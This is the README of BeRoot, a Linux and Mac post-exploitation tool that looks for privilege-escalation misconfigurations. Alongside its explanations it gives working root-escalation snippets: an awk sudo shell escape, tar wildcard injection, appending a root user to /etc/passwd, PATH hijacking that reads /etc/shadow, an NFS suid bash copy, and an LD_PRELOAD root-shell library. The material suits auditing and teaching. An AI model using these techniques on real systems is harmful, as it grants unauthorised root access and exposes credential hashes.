# BeRoot For Linux

BeRoot is a post exploitation tool to check common misconfigurations on Linux and Mac OS to find a way to escalate our privilege. 

I recommend reading all the README to understand all checks performed by Beroot. \
If you have the user password, specify it as argument, you could get more results. 

```
python beroot.py --password super_strong_password
```


GTFOBins
----

[GTFOBins](https://gtfobins.github.io/#) could be used to gain root privilege on a system. These binaries allow a user to execute arbitrary code on the host, so imagine you could have access to one of them with sudo privilege (suid binary or if it's allowed on the sudoers file), you should be able to execute system command as root. BeRoot contains a list of theses binaries taken from [GTFOBins](https://gtfobins.github.io/#).  

Here is an example of a well-known binary: 

* awk
```
sudo awk 'BEGIN {system("/bin/sh")}'
```

__Note__: If you have more binary example, do not hesitate to open an issue explaining the technic and I will add it on the list. 

Having sudo access on these binaries do not mean you could always manage to execute commands on the system. For example, using the __mount__ binary with a limited user could give you the following well known error, if it's well configured:  

```
mount: only root can use "--options" option
```

Wildcards
----

If you have never heard about Unix wildcards, I suggest you read this very well explained [article](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt).
Using wildcards could lead into code execution if this one is not well called. 

For our example, we want to get a shell ("sh") using the __tar__ command to execute code on the server. As explained on the GTFOBins section, we could get it doing: 
```
tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh
```
We consider a test file which is used to realize an archive of all files present on the directory. 
```
user@host:~$ cat test.sh 
tar cf archive.tar * 
```
Here are the steps to exploit this bad configuration: 
* open nano (with no arguments)
* write something in it
* save file using __tar__ arguments as file names: 
	* --checkpoint-action=exec=sh
	* --checkpoint=1

Once created, this is what you will find: 
```
user@host:~$ ls -la 
total 32
-rw-r--r-- 1 user user     5 Jan 12 10:34 --checkpoint-action=exec=sh
-rw-r--r-- 1 user user     3 Jan 12 10:33 --checkpoint=1
drwxr-xr-x 2 user user  4096 Jan 12 10:34 .
drwxr-xr-x 7 user user  4096 Jan 12 10:29 ..
-rwxr-xr-x 1 user user    22 Jan 12 10:32 test.sh
```
If this file is executed as root (from cron table, from sudoers, etc.), you should gain root access on the system. 

```
user@host:~$ sudo ./test.sh 
sh-4.3# id
uid=0(root) gid=0(root) groups=0(root)
```
So depending on which binary and how the wildcard are used, the exploitation can be done or not. So on our example, the exploitation would not work anymore if the file would be like this: 
```
user@host:~$ cat test.sh 
tar cf archive.tar *.txt
```
Thus, using a tool to detect these misconfigurations is very difficult. A manually analyse should be done to check if it's a false positive or not. 


Sensitive files 
----

Lots of file are run with high permissions on the system (e.g cron files, services, etc.). Here is an example of intersting directories and files:
```
/etc/init.d
/etc/cron.d 
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/passwd
/etc/shadow
/etc/at.allow
/etc/at.deny
/etc/crontab
/etc/cron.allow
/etc/cron.deny
/etc/anacrontab
/var/spool/cron/crontabs/root
/usr/lib
/lib
/etc/ld.so.conf
```

For example, if we have write permission on `/etc/passwd` we could get root. Tips from [here](https://twitter.com/nemesis09/status/1136263868177616896)
```
echo zapata::0:0:New user:/root:/bin/bash >> /etc/passwd
su zapata
```

[Here](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html) are another example if a writable file is found on `/etc/ld.so.conf` which could lead to hijack dlls. 

Here are the tests done by BeRoot: 
* checks if you have access with write permission on these files. 
* checks inside the file, to find other paths with write permissions. 
* if files are executables or scripts, root directory are checked to detect if we have write access on it (useful for library hijacking, etc.)/

Services
----

Services are listed using dbus. If `python-dbus` is not present on the remote host, no services are checked (except those found on /etc/init.d/). However, you should not have this error using [Pupy](https://github.com/n1nj4sec/pupy/) because this lib is remotely loaded on the remote system. 

Binpath and root directories are checked to see if there are write access.

Suid binaries
----

SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. So if suid file is owned by root, you should execute it using root privilege. 

BeRoot prints all suid files because a manually analyse should be done on each binary. However, it realizes some actions: 
* checks if we have write permissions on these binary (why not ? :))
* checks if a GTFOBins is used as suid to be able to execute system commands using it (remember you could have suid GTFOBins without beeing able to exectute commands - checks GTFOBins section with the false positive example using __mount__). 
* checks if system function (from libc) is used. If so, try to check if a bin is called without using an absolute path (some false positive could occurs in this check). For more information check the PATH environment variable section.  
* checks if an exec function (from libc) is used. If so, try to find a file with writable access. 
   
To analyse manually, checking for .so files loaded from a writable path should be a great idea (this check has not been implemented on BeRoot): 
```
strace [SUID_PATH] 2>&1 | grep -i -E "open|access|no such file"
```

Path Environment variable
----
system will call the shell (sh) to execute the command sent as an argument.

For example, if a C program calls the system function like so: 
```
#include<unistd.h>
void main()
{
	setuid(0);
	setgid(0);
	system("whoami");
}
``` 
The binary whoami can be hijacked with the PATH environment variable like so: 
```
cd /tmp
echo "cat /etc/shadow" > whoami
chmod 777 whoami
export PATH=/tmp:$PATH
```
For more information, checks these two examples [here](https://0xrick.github.io/hack-the-box/zipper/#privilege-escalation-and-getting-root) and [here](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

To detect it, on each suid binary, we try to find the system call using objdump. 
```
objdump -T suid_bin | grep " system"
```

If it exists, we realise a `strings` on this binary, and try to found a string which does not use an absolute path and that it exists as a built in binary (/bin, /usr/bin, /sbin, etc.). Some false positive can occur, so a manual check should be done.     

This cannot be done if exec functions are used (execve|execl|execlp|execle|execv|execvp|execvpe) because the file should be run from an absolute path. 

NFS Root Squashing
----

If __no_root_squash__ appears in `/etc/exports`, privilege escalation may be done. More information can be found [here](https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/).

Exploitation:
```
mkdir /tmp/nfsdir  # create dir
mount -t nfs 192.168.1.10:/shared /tmp/nfsdir # mount directory 
cd /tmp/nfsdir
cp /bin/bash . 	# copy wanted shell 
chmod +s bash 	# set suid permission
```

LD_PRELOAD
----

If __LD_PRELOAD__ is explicitly defined on sudoers file, it could be used to elevate our privilege. \

For example: 
```
Defaults        env_keep += LD_PRELOAD
```

Create a share object:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Compile it:
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

If you have a binary that you could launch with sudo and NOPASSWD, launch it with LD_PRELOAD pointing to your shared object:
```
sudo LD_PRELOAD=/tmp/shell.so find
```

More information can be found [here](http://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/).

Sudoers file
----

Most of privilege escalations on Linux servers are done using bad sudo configurations. This configuration can be seen in __/etc/sudoers__ file. \
To better understand the BeRoot workflow, you should have an idea on how a sudoers line is composed.  

Basic line pattern: 
```
users  hosts = (run-as) tags: commands
```

Here is an example using aliases. 
```
User_Alias ADMINS = admin, user, root
Cmnd_Alias ADMIN_CMDS = /sbin/service, /usr/sbin/iptables, python /tmp/file.py
ADMINS ALL = (ALL) NOPASSWD: ADMIN_CMDS
```
So users "admin", "user" and "root" could execute "service", "iptables" and "file.py" without password needed (thanks to NOPASSWD): 
```
admin,user,root ALL = (ALL) NOPASSWD: /sbin/service, /usr/sbin/iptables, python /tmp/file.py
```

So BeRoot will analyse all rules: 
* if it affects our user or our user's group: 
	* check if we have write permissions on all possible commands (in our example, it will test "service", "iptables", "python" and "/tmp/files.py")
	* check for GTFOBins
	* check if we can impersonate another user ("su" command)
		* realize again all these checks on the sudoers file using this new user

Sudo list
----

Sometimes you do not have access to /etc/sudoers. 
```
$ cat /etc/sudoers
cat: /etc/sudoers: Permission denied
```
However, listing sudo rules is possible using sudo -l
```
$ sudo -l  
Matching Defaults entries for test on XXXXX:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User test may run the following commands on XXXXX:
    (ALL) /bin/bash
```
Why is it possible ? On the [documentation](https://www.sudo.ws/man/1.8.17/sudoers.man.html) it's written: 
```By default, if the NOPASSWD tag is applied to any of the entries for a user on the current host, he or she will be able to run "sudo -l" without a password. [...] This behavior may be overridden via the verifypw and listpw options```

However, these rules only affect the current user, so if user impersonation is possible (using su) `sudo -l` should be launched from this user as well. \
BeRoot collects all these rules from all possible user an realize exaclty the same tests as listed perviously (e.g sudoers file method).

Be careful ! If the user does not have the directive `NOPASSWD` in one of his rules, we cannot list sudo rules without his user password. 

```
$ sudo -l 
Password: 
```

In this case, specify the user password to Beroot. 

```
python beroot.py --password super_strong_password
```

Python Library Hijacking
----
If any of these search paths are world writable, it will impose a risk of privilege escalation, as placing a file in one of these directories with a name that matches the requested library will load that file, assuming it's the first occurrence.

```
Directory of the script being executed
/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages
```

These path could be found running: 
```
python -c 'import sys; print "\n".join(sys.path)'
```

More information can be found [here](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/).


Capabilities
----

On some system, instead of adding suid right on a binary, administrator add capabilities on it.

If `/sbin/getcap` is present on the filesystem, capabilities on all binaries located on `/usr/bin/` or `/usr/sbin/` are listed. Depending on the capability assigned, some privilege actions could be done. 

This idea comes from 0xrick's [write up](https://0xrick.github.io/hack-the-box/waldo/).


Ptrace Scope
----

If ptrace is fully enabled (e.g. `/proc/sys/kernel/yama/ptrace_scope == 0`), it will be possible to read processes memory. 
If it's enabled, check [sudo_inject](https://github.com/nongiach/sudo_inject) project or inject some processes using libs like [memorpy](https://github.com/n1nj4sec/memorpy/).

From the [documentation](https://www.kernel.org/doc/html/v4.14/admin-guide/LSM/Yama.html), the value of ptrace_scope represent: 
```
0 - classic ptrace permissions: a process can PTRACE_ATTACH to any other process running under the same uid, as long as it is dumpable (i.e. did not transition uids, start privileged, or have called prctl(PR_SET_DUMPABLE...) already). Similarly, PTRACE_TRACEME is unchanged.

1 - restricted ptrace: a process must have a predefined relationship with the inferior it wants to call PTRACE_ATTACH on. By default, this relationship is that of only its descendants when the above classic criteria is also met. To change the relationship, an inferior can call prctl(PR_SET_PTRACER, debugger, ...) to declare an allowed debugger PID to call PTRACE_ATTACH on the inferior. Using PTRACE_TRACEME is unchanged.

2 - admin-only attach: only processes with CAP_SYS_PTRACE may use ptrace with PTRACE_ATTACH, or through children calling PTRACE_TRACEME.

3 - no attach: no processes may use ptrace with PTRACE_ATTACH nor via PTRACE_TRACEME. Once set, this sysctl value cannot be changed.
```

Exploit
----

Because lots of server are vulnerable to well known exploit (dirtycow, etc.), I have embeeded [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) to give an overview of potential CVE that affect the kernel (this module will only work for Linux systems). 


Monitoring
----

Monitoring could be useful to detect what's running on the system. Beroot does not that but it's possible to list some processes from other users, cron jobs, etc whithout needed root privileges. This could be done using [pspy](https://github.com/DominicBreuker/pspy).


Interesting write up 
----

* 0xRick [blog](https://0xrick.github.io/categories/)
* Raj Chandel's [blog](https://github.com/Ignitetechnologies/Privilege-Escalation)
